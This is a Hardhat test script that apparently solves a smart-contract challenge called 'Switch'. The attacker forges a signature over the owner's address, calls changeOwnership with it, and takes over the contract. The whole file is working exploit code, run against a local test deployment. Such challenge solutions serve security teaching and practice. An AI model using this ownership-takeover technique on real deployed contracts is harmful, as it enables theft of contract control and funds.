import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('Switch', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;
  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (await ethers.getContractFactory('Switch', deployer)).deploy();

    await target.deployed();

    target = target.connect(attacker);
  });

  it('attack', async () => {
    const hash = ethers.utils.keccak256(
      ethers.utils.concat([
        ethers.utils.toUtf8Bytes('\x19Ethereum Signed Message:\n32'),
        ethers.utils.keccak256(await target.owner()),
      ])
    );

    const signature = await attacker.signMessage(hash);

    const { v, r, s } = ethers.utils.splitSignature(signature);

    const tx = await target['changeOwnership(uint8,bytes32,bytes32)'](v, r, s);

    await tx.wait();

    expect(await target.owner()).to.equal(attacker.address);
  });
});
